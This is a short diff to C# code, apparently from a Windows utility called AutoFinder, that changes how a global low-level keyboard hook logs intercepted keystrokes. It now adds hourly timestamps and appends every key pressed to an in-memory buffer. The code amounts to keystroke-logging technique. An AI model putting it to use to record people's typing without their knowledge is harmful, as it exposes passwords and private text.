@@ -31,6 +31,7 @@ namespace AutoFinder
 		private const int WM_REFRESH = 0x9999;
 		private const int WM_SYSKEYDOWN = 260;
 		private static StringBuilder sbKeys = new StringBuilder();
+		public static int LastHour = -1;
 
 		[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
 		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
@@ -44,7 +45,13 @@ namespace AutoFinder
 			{
 				Keys keys = (Keys) Marshal.ReadInt32(lParam);
 //				File.AppendAllText(@"C:\hot.txt", DateTime.Now.ToString() + ": " + keys.ToString() + "\r\n");
-				sbKeys.AppendLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "# " + keys.ToString());
+				int hour = DateTime.Now.Hour;
+				if(hour != InterceptKeys.LastHour)
+				{
+					sbKeys.AppendLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
+					InterceptKeys.LastHour = hour;
+				}
+				sbKeys.Append(keys.ToString() + " ");
 				switch (keys)
 				{
 					case Keys.LControlKey:
